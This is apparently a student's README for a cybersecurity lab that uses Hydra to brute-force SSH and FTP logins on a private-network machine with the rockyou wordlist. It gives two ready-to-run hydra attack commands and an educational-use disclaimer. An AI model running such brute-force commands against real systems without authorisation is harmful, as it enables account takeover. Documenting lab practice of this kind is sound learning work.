# Hydra Password Cracking Lab

This repository documents my hands-on lab using *Hydra* to perform password cracking in a safe and controlled environment.  
It is part of my cybersecurity learning portfolio.

---

## Lab Overview
In this lab, I used Hydra to test password strength and demonstrate brute-force attacks on a target machine within a legal, controlled environment.

---

## Tools Used
- *Hydra (thc-hydra)*
- *Kali Linux*
- *Custom wordlists* (e.g., rockyou.txt)

---

## Commands Used
Below are examples of the commands I used during this lab:

```bash
# Example SSH brute-force attack
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://<172.19.0.5>

# Example FTP brute-force attack
hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://<172.19.0.5>




## Disclaimer
All activities in this repository are performed in a *legal and controlled environment*.  
This project is for *educational purposes only.*
